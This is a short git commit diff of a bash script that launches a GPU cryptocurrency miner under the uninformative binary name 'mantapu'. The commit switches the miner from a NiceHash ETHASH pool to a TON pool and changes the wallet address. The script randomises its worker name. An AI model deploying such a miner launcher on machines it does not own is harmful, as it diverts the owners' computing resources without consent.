530bb038668b153916f72bab8d92d0254cd412f0
d-crypto99 <79061002+d-crypto99@users.noreply.github.com>
2022-01-22 15:03:31 +0700

    Update gpu-nvidia.sh

--- gpu-nvidia.sh
+++ gpu-nvidia.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
-POOL=daggerhashimoto.eu-north.nicehash.com:3353
-WALLET=36yg6GbEqDX8wB5mGRcVzCrbJ55RKaJT9A.xroc3
+POOL=https://pool.services.tonwhales.com
+WALLET=EQC3Kt2DCvHO8MDUjG04zElTk0URbNqp3n9r9_4RbhWG-pmi.xcroc4
 WORKER=$(echo $(shuf -i 1-4 -n 1)-GPU)
 chmod +x mantapu
-./mantapu --algo ETHASH --pool $POOL --user $WALLET.$WORKER
+./mantapu --algo TON --pool $POOL --user $WALLET.$WORKER
